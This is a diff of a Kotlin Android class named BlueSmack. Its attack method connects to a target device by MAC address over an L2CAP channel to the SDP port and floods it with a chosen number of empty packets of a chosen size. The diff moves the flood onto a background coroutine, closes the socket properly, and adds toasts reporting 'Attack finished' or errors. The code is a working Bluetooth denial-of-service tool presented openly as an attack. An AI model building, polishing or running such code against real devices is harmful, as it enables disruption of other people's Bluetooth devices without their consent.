@@ -8,19 +8,23 @@ import android.content.pm.PackageManager
 import androidx.core.app.ActivityCompat
 import java.io.IOException
 
+import android.widget.Toast
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.withContext
+
 class BlueSmack(
     private val context: Context,
     private val bluetoothAdapter: BluetoothAdapter?
 ) {
-    fun attack(macAddress: String, packetSize: Int, packetCount: Int) {
+    suspend fun attack(macAddress: String, packetSize: Int, packetCount: Int) {
         if (bluetoothAdapter == null) {
-            // Handle Bluetooth not supported
+            // TODO: Propagate error to UI: Bluetooth not supported
             return
         }
 
         val device: BluetoothDevice? = bluetoothAdapter.getRemoteDevice(macAddress)
         if (device == null) {
-            // Handle device not found
+            // TODO: Propagate error to UI: Device not found
             return
         }
 
@@ -29,21 +33,29 @@ class BlueSmack(
                 Manifest.permission.BLUETOOTH_CONNECT
             ) != PackageManager.PERMISSION_GRANTED
         ) {
-            // Handle missing permission
+            // TODO: Propagate error to UI: Missing permission
             return
         }
 
-        try {
-            val socket = device.createL2capChannel(1) // PSM for SDP
-            socket.connect()
-            val outputStream = socket.outputStream
-            val payload = ByteArray(packetSize)
-            for (i in 0 until packetCount) {
-                outputStream.write(payload)
+        withContext(Dispatchers.IO) {
+            try {
+                device.createL2capChannel(1).use { socket -> // PSM for SDP
+                    socket.connect()
+                    val outputStream = socket.outputStream
+                    val payload = ByteArray(packetSize)
+                    for (i in 0 until packetCount) {
+                        outputStream.write(payload)
+                    }
+                    withContext(Dispatchers.Main) {
+                        Toast.makeText(context, "Attack finished", Toast.LENGTH_SHORT).show()
+                    }
+                }
+            } catch (e: IOException) {
+                withContext(Dispatchers.Main) {
+                    Toast.makeText(context, "Error: ${e.message}", Toast.LENGTH_LONG).show()
+                }
+                e.printStackTrace()
             }
-            socket.close()
-        } catch (e: IOException) {
-            e.printStackTrace()
         }
     }
 }
